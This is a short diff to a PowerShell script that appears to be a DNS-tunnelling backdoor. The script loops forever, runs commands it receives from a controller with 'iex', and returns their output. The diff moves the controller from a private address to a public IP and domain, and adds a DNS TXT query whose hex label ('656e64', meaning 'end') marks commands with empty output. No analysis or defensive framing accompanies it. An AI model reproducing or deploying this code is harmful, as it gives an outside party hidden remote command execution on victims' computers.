@@ -1,5 +1,5 @@
-﻿$server = '192.168.0.108'
-$name = 'koratxt.com'
+﻿$server = '54.156.28.185'
+$name = 'koratxt.net'
 $id = Get-Content env:computername
 if ($id.Length -gt 10) {
     $id = $id.Substring(0,10)
@@ -73,6 +73,9 @@ while ($true) {
         $response = (iex "$cmd") | Out-String
         if ($response.Length -gt 0) {
             send_response $response
+        }
+        else {
+            $(Resolve-DnsName -Name "656e64.$name" -Type TXT)
         }
     }
     sleep -Seconds 5
